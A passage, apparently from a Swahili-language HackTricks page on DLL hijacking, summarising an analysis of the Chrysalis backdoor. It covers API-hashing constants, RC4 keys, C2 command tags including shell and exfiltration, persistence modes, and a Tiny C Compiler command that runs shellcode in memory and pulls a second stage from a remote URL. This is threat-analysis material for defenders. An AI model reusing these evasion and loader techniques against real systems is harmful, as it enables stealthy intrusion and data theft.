- Host EXE inaimporta `log.dll` na inaita `LogInit`/`LogWrite`. `LogInit` mmap-loads blob; `LogWrite` inaidecrypt na stream ya LCG maalum (constants **0x19660D** / **0x3C6EF35F**, key material ikichangiwa kutoka kwa hash ya awali), inaandika tena buffer na plaintext shellcode, inaondoa temps, na inaruka kwenda kwa hiyo.
- Ili kuepuka IAT, loader inatatua APIs kwa kuhashing majina ya export kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia Murmur-style avalanche (**0x85EBCA6B**) na kulinganisha dhidi ya salted target hashes.

Main shellcode (Chrysalis)
- Ina-decrypt module kuu yenye muonekano wa PE kwa kurudia add/XOR/sub na key `gQ2JR&9;` mara tano, kisha kwa njia ya dynamic inaload `Kernel32.dll` → `GetProcAddress` kumalizia import resolution.
- Ina-reconstruct strings za majina ya DLL wakati wa runtime kupitia per-character bit-rotate/XOR transforms, kisha inaload `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Inatumia resolver ya pili inayopitia **PEB → InMemoryOrderModuleList**, inachambua kila export table katika blocks za 4-byte kwa Murmur-style mixing, na inarudi kwa `GetProcAddress` tu ikiwa hash haipatikani.

Embedded configuration & C2
- Config iko ndani ya faili iliyodondolewa `BluetoothService` kwenye **offset 0x30808** (size **0x980**) na ime- RC4-decrypted kwa key `qwhvb^435h&*7`, ikifichua C2 URL na User-Agent.
- Beacons hujenga host profile yenye dot-delimited, huweka tag `4Q` mbele, kisha hufanya RC4-encrypt na key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` juu ya HTTPS. Responses zina-decrypt kwa RC4 na kutumwa kwa tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Mode ya utekelezaji inaegemewa na CLI args: bila args = install persistence (service/Run key) ikielekeza kwa `-i`; `-i` inarudisha kujizindua tena na `-k`; `-k` inajisahau install na inafanya payload.

Alternate loader observed
- Infiltration ile ile iliweka Tiny C Compiler na ikatekeleza `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, na `libtcc.dll` kando yake. C source iliyotolewa na mwizi ilikuwa imejaza shellcode, ilisomwa, na ikakimbia kwa-memory bila kugusa disk na PE. Kuiga kutumia:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hatua hii ya TCC-based compile-and-run iliingiza `Wininet.dll` wakati wa utekelezaji na kuvuta shellcode ya awamu ya pili kutoka kwenye hardcoded URL, ikitoa loader yenye ufanisi inayojificha kama compiler run.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
